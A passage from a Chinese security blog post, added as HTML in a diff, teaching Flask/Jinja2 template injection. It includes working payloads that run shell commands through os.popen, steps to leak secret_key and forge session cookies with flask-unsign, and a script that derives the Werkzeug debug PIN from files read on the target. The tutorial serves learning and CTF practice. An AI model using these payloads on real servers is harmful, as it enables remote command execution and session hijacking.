+<li>循环找类直接利用</li>
+</ul>
+<pre tabindex="0"><code>{% for i in &quot;&quot;.__class__.__base__.__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__.__getitem__('os').popen('whoami').read()}}{% endif %}{% endfor %}
+
+# 实际上这里找到的是subprocess.Popen类，然后利用os模块的popen去执行命令
+</code></pre><ul>
+<li>用已有对象或函数直接利用</li>
+</ul>
+<p>使用<code>lipsum、url_for、get_flashed_messages</code>函数或<code>request</code>对象直接利用，不需要使用数字进行索引取值。</p>
+<pre tabindex="0"><code>{{lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()}}
+</code></pre><h2 id="进阶利用">进阶利用</h2>
+<h3 id="flask-session利用">flask session利用</h3>
+<h4 id="session结构">session结构</h4>
+<p><code>eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY</code></p>
+<p>以<code>.</code>分为三个部分：1)第一部分为session data进行base64后的结果，2)第二部分为时间戳，flask中时间戳超过31天视为无效，3)第三部分是session data、 时间戳、flask中的<code>secret key</code>通过sha算法进行hash后的结果。</p>
+<blockquote>
+<p>注意：</p>
+<p>其中所有base64部分去掉了<code>=</code>号，当decode失败可填入部分<code>=</code>号补全;</p>
+<p>解时间戳：</p>
+<pre tabindex="0"><code>int.from_bytes(base64_decode(session-timestamp),byteorder='big')
+</code></pre></blockquote>
+<h4 id="伪造session">伪造session</h4>
+<ul>
+<li>通过<code>{{config}}</code>获取泄露的secret_key：</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1253; 
+			flex-basis: 3008px"
+	>
+	<a href="/p/ssti/image-20220203154405927.png" data-size="1592x127">
+		<img src="/p/ssti/image-20220203154405927.png"
+			width="1592"
+			height="127"
+			srcset="/p/ssti/image-20220203154405927_huf6abb855324dfaee42f1892667d68b35_65630_480x0_resize_box_3.png 480w, /p/ssti/image-20220203154405927_huf6abb855324dfaee42f1892667d68b35_65630_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220203154405927">
+	</a>
+	
+	<figcaption>image-20220203154405927</figcaption>
+	
+</figure></p>
+<p>可利用<code>Flask Unsign</code>工具伪造session：</p>
+<pre tabindex="0"><code>flask-unsign --sign --cookie &quot;{'logged_in': True}&quot; --secret 'CHANGEME'
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 2300; 
+			flex-basis: 5520px"
+	>
+	<a href="/p/ssti/image-20220203155913837.png" data-size="897x39">
+		<img src="/p/ssti/image-20220203155913837.png"
+			width="897"
+			height="39"
+			srcset="/p/ssti/image-20220203155913837_hu933c34dc66a7d7478a6a19c5d5d222ab_16482_480x0_resize_box_3.png 480w, /p/ssti/image-20220203155913837_hu933c34dc66a7d7478a6a19c5d5d222ab_16482_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>也可利用该工具解session(一般手动解就已经很方便)：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1794; 
+			flex-basis: 4306px"
+	>
+	<a href="/p/ssti/image-20220203160155120.png" data-size="987x55">
+		<img src="/p/ssti/image-20220203160155120.png"
+			width="987"
+			height="55"
+			srcset="/p/ssti/image-20220203160155120_hucdff5e931c60050fe4999c3d0a4901ea_15668_480x0_resize_box_3.png 480w, /p/ssti/image-20220203160155120_hucdff5e931c60050fe4999c3d0a4901ea_15668_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>尝试破解常见的secret_key:</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 710; 
+			flex-basis: 1705px"
+	>
+	<a href="/p/ssti/image-20220203160332247.png" data-size="995x140">
+		<img src="/p/ssti/image-20220203160332247.png"
+			width="995"
+			height="140"
+			srcset="/p/ssti/image-20220203160332247_hu3ad9fa4757c6a2b9dbef421c5b32bbce_38320_480x0_resize_box_3.png 480w, /p/ssti/image-20220203160332247_hu3ad9fa4757c6a2b9dbef421c5b32bbce_38320_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="flask-pin码利用">flask PIN码利用</h3>
+<p>Flask在debug模式下可产生一个交互式shell，但需要输入一个PIN码，一台机器上多次重启Flask应用，PIN码值不改变表明存在一定规律。</p>
+<p><strong>生成PIN码的脚本：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;cool&#39;</span><span class="p">,</span><span class="c1"># username</span>
+    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
+    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+    <span class="s1">&#39;/home/cool/.local/lib/python3.9/site-packages/flask/app.py&#39;</span><span class="p">,</span><span class="c1"># getattr(mod, &#39;__file__&#39;, None)</span>
+<span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;52242275645&#39;</span><span class="p">,</span> <span class="s1">&#39;cdb9fdddb45e4f95b043309c818c3ff5&#39;</span><span class="p">]</span>
+<span class="c1"># 第一个元素：str(uuid.getnode()),  /sys/class/net/eth0/address</span>
+<span class="c1"># 第二个元素：get_machine_id(), /etc/machine-id</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cookiesalt&#34;</span><span class="p">)</span>
+
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;__wzd</span><span class="si">{</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span>
+
+
+<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;pinsalt&#34;</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span><span class="si">:</span><span class="s2">09d</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+                <span class="n">num</span><span class="p">[</span><span class="n">x</span> <span class="p">:</span> <span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
+                <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">)</span>
+            <span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></div><p><strong>脚本中各参数的获取方法：</strong></p>
+<ul>
+<li>username</li>
+</ul>
+<p>当前运行Flask应用的用户名，可读取/etc/passwd获取</p>
+<ul>
+<li>modname</li>
+</ul>
+<p>一般默认</p>
+<ul>
+<li>appname</li>
+</ul>
+<p>一般默认</p>
+<ul>
+<li>路径</li>
+</ul>
+<p>通过报错获取：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 351; 
+			flex-basis: 844px"
+	>
+	<a href="/p/ssti/image-20220203164001173.png" data-size="598x170">
+		<img src="/p/ssti/image-20220203164001173.png"
+			width="598"
+			height="170"
+			srcset="/p/ssti/image-20220203164001173_hu582dbb45c56f2b6739c044e90919e4b6_28693_480x0_resize_box_3.png 480w, /p/ssti/image-20220203164001173_hu582dbb45c56f2b6739c044e90919e4b6_28693_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>网络地址</li>
+</ul>
+<p>读取<code>/sys/class/net/eth0/address</code>，并进行进制转换：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1385; 
+			flex-basis: 3324px"
+	>
+	<a href="/p/ssti/image-20220203164517414.png" data-size="554x40">
+		<img src="/p/ssti/image-20220203164517414.png"
+			width="554"
+			height="40"
+			srcset="/p/ssti/image-20220203164517414_hu72191e721b6a0cee055289bdb888a8ef_8092_480x0_resize_box_3.png 480w, /p/ssti/image-20220203164517414_hu72191e721b6a0cee055289bdb888a8ef_8092_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<pre tabindex="0"><code>int(&quot;00:0c:29:e1:dd:3d&quot;.replace(&quot;:&quot;, &quot;&quot;), 16)
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1277; 
+			flex-basis: 3065px"
+	>
+	<a href="/p/ssti/image-20220203164607833.png" data-size="447x35">
+		<img src="/p/ssti/image-20220203164607833.png"
+			width="447"
+			height="35"
+			srcset="/p/ssti/image-20220203164607833_hu2e336299985bdefcbe400589d8566356_5614_480x0_resize_box_3.png 480w, /p/ssti/image-20220203164607833_hu2e336299985bdefcbe400589d8566356_5614_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>机器码</li>
+</ul>
+<p>默认生成方式为先依次读取<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_id</code>，读到其中一个则退出，继续读取<code>/proc/self/cgroup</code>中第一行中以最右侧<code>/</code>分割的右边部分内容，最后将两部分进行拼接得到机器码。</p>
+<blockquote>
+<p>不同版本中机器码的生成方式有区别</p>
+</blockquote>
+<p><strong>执行脚本：</strong></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 516; 
+			flex-basis: 1240px"
+	>
+	<a href="/p/ssti/image-20220203182045494.png" data-size="274x53">
+		<img src="/p/ssti/image-20220203182045494.png"
+			width="274"
+			height="53"
+			srcset="/p/ssti/image-20220203182045494_hu0eabe297fbfbcbacb93714592820b35d_6235_480x0_resize_box_3.png 480w, /p/ssti/image-20220203182045494_hu0eabe297fbfbcbacb93714592820b35d_6235_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1297; 
+			flex-basis: 3113px"
+	>
+	<a href="/p/ssti/image-20220203182035925.png" data-size="480x37">
+		<img src="/p/ssti/image-20220203182035925.png"
+			width="480"
+			height="37"
+			srcset="/p/ssti/image-20220203182035925_hub8eaa7c8f576b501b87ba31fb70e5dd2_7741_480x0_resize_box_3.png 480w, /p/ssti/image-20220203182035925_hub8eaa7c8f576b501b87ba31fb70e5dd2_7741_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mssql/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mssql/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关"
+                        data-key="mssql" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MSSQL 注入与提权相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权"
+                        data-key="mysql-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell"
+                        data-key="mysql-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 注入写 shell</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#模板">模板</a></li>
+    <li><a href="#基本原理">基本原理</a></li>
+    <li><a href="#flask模板注入">flask模板注入</a>
+      <ol>
+        <li><a href="#搭建环境">搭建环境</a></li>
+        <li><a href="#基础">基础</a>
+          <ol>
+            <li><a href="#内建属性和方法的使用">内建属性和方法的使用</a></li>
+            <li><a href="#过滤器的使用">过滤器的使用</a></li>
+          </ol>
+        </li>
+        <li><a href="#寻找注入点">寻找注入点</a></li>
+        <li><a href="#基本漏洞利用">基本漏洞利用</a>
+          <ol>
+            <li><a href="#一般可利用的类和函数">一般可利用的类和函数</a></li>
+          </ol>
+        </li>
+        <li><a href="#绕过方法">绕过方法</a>
+          <ol>
+            <li><a href="#过滤">过滤<code>.</code></a></li>
+            <li><a href="#过滤引号">过滤引号</a></li>
+            <li><a href="#过滤-1">过滤<code>()</code></a></li>
+            <li><a href="#过滤_">过滤<code>_</code></a></li>
+            <li><a href="#过滤各类关键字">过滤各类关键字</a></li>
+            <li><a href="#过滤-2">过滤<code>{}</code></a></li>
+            <li><a href="#过滤-3">过滤<code>[]</code></a></li>
+            <li><a href="#过滤数字">过滤数字</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#进阶利用">进阶利用</a>
+      <ol>
+        <li><a href="#flask-session利用">flask session利用</a>
+          <ol>
+            <li><a href="#session结构">session结构</a></li>
+            <li><a href="#伪造session">伪造session</a></li>
+          </ol>
+        </li>
+        <li><a href="#flask-pin码利用">flask PIN码利用</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
